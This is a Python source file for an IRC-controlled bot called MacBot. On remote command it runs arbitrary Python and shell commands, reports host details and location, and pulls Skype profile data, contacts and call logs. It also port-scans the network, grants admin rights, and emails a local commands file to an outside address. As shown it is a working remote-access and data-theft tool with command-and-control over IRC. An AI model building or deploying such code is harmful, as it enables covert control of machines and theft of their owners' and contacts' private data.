import re
import time
import signal
import sys
import json
import requests

sys.path.append("..")

from programs import BaseProgram
from node import Node
from links import IRCLink, UDPLink
from routers import MessageRouter

import skype
import network
import shell_tools
import identification
import communication


from settings import IRC_CONNECTIONS, VERSION, MAIN_USER, ADMINS

def R(pattern):
    return re.compile(pattern)

class MacBot(BaseProgram):
    router = MessageRouter()

    def __init__(self, node):
        super(MacBot, self).__init__(node)
        self.router.node = node

    def recv(self, packet, interface):
        message = packet.decode()
        self.node.log('\n< [RECV]  %s' % message)
        self.router.recv(self, message, interface)

    def send(self, message, interface):
        if not (hasattr(message, '__iter__') and not hasattr(message, '__len__')):
            # if message is not a list or generator
            message = [message]

        for line in message:
            line = line if type(line) in (str, bytes) else '{0}'.format(line)
            if not line.strip():
                continue

            self.node.log('\n> [SENT]  %s' % line)
            packet = bytes(line, 'utf-8') if type(line) is str else line
            self.node.send(packet, interface)


    @router.route(R('^!?reload'))
    def reload(self, message, interface):
        self.send('[*] Disconnecting...', interface)
        interface.stop()
        self.node.interfaces.remove(interface)

        interface = interface.__class__(interface.name, interface.port)
        interface.start()
        self.node.interfaces.append(interface)

        self.send('[√] Reconnected.', interface)

    @router.route(R('^!?version'))
    def get_version(self, message, interface):
        self.send(VERSION, interface)

    @router.route(R('^!?identify'))
    def identify(self, message, interface):
        self.send(identification.get_system_short(), interface)

    @router.route(R('^!?details'))
    def host_details(self, message, interface):
        self.send(identification.get_system_full(), interface)

    @router.route(R('^!?locate'))
    def locate(self, message, interface):
        self.send(str(geo_locate()), interface)

    @router.route(R('^!?status'))
    def status(self, message, interface):
        self.send(interface, interface)

    @router.route(R('^!?admin'))
    def make_admin(self, message, interface):
        global ADMINS
        to_make_admin = message.split('admin ', 1)[1].strip()
        if to_make_admin and to_make_admin not in ADMINS:
            ADMINS.append(to_make_admin)
        self.send('ADMINS: %s' % ','.join(ADMINS), interface)

    @router.route(R('^!?unadmin'))
    def unmake_admin(self, message, interface):
        global ADMINS
        to_unmake_admin = message.split('unadmin ', 1)[1].strip()
        ADMINS.remove(to_unmake_admin)
        self.send('ADMINS: %s' % ','.join(ADMINS), interface)

    @router.route(R('^\>\>\>'))
    def eval_python(self, message, interface):
        result = shell_tools.run_python(message[3:])
        self.send(result, interface)

    @router.route(R('^\$'))
    def eval_shell(self, message, interface):
        result = shell_tools.run_shell(message[1:])
        self.send(result, interface)

    @router.route(R('^!?skype$'))
    def skype_info(self, message, interface):
        for line in skype.get_profile_info(skype.find_profiles(MAIN_USER)):
            self.send(line, interface)

    @router.route(R('^!?skype_contacts$'))
    def skype_contacts(self, message, interface):
        for line in skype.get_contacts(skype.find_profiles(MAIN_USER)):
            self.send(line, interface)

    @router.route(R('^!?skype_calls$'))
    def skype_calls(self, message, interface):
        for line in skype.get_calls(skype.find_profiles(MAIN_USER)):
            self.send(line, interface)

    @router.route(R('^!?portscan'))
    def portscan(self, message, interface):
        for line in network.portscan():
            self.send(line, interface)

    @router.route(R('^!?email'))
    def email(self, message, interface):
        target = 'bot-test@sweeting.me'
        attachments = ['/Users/squash/.stats/commands.csv']
        result = communication.email(target, attachments=attachments)
        self.send(result, interface)

def setup():
    connections = [IRCLink(**config) for config in IRC_CONNECTIONS]
    # connections = [UDPLink('en1', 2012)]
    node = Node(connections, 'macbot', Program=MacBot)

    [conn.start() for conn in connections]
    node.start()

    return node, connections

def runloop(node, connections):
    try:
        while True:
            message = input("\nEVAL:".ljust(31))
            print("------------------------------" + len(message) * '=')
            node.recv(bytes(message, 'UTF-8'), connections[0])
            time.sleep(0.1)

    except (EOFError, KeyboardInterrupt):   # CTRL-D, CTRL-C
        node.stop()
        [conn.stop() for conn in connections]


if __name__ == '__main__':
    node, connections = setup()
    runloop(node, connections)
